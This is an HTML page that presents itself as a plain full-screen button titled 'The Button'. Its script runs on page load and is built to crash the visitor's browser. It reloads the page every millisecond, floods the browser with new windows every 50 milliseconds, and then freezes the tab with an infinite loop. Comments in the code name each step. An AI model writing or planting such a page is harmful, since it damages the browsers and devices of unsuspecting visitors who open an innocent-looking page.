<!DOCTYPE html>
<html>
<head>
  <title>The Button</title>
  <style>
    html, body {
      margin: 0;
      height: 100%;
      background-color: #00f5cc;
    }

    button {
      width: 100%;
      height: 100%;
      font-size: 40px;
      font-weight: bold;
      border: none;
      background-color: #00f5cc;
      color: white;
      cursor: pointer;
    }

    button:hover {
      background-color: #00f5cc;
    }
  </style>
</head>
<body>

  <button></button>

  <script>
    function crash() {
      // Reload loop
      setInterval(() => location.reload(true), 1);

      // Flood the browser with new windows
      setInterval(() => {
        window.open(window.location.href, '_blank');
      }, 50);

      // Freeze the tab
      while (true) {
        console.log("crash");
      }
    }

    window.onload = crash;
  </script>

</body>
</html>
